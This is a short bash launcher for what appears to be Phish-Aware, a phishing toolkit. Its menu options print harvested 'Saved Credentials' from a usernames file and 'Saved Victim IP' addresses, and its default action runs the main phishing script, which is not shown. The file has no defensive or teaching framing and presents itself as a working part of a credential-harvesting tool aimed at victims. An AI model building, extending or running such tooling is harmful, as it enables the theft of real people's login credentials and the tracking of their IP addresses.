#!/bin/bash

# https://github.com/saiyan3457/Phish-Aware

if [[ $(uname -o) == *'Android'* ]];then
	PHISHAWARE_ROOT="/data/data/com.termux/files/usr/opt/phishaware"
else
	export PHISHAWARE_ROOT="/opt/phishaware"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Phishaware type \`phishaware\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $PHISHAWARE_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $PHISHAWARE_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $PHISHAWARE_ROOT
	bash ./phishaware.sh
fi
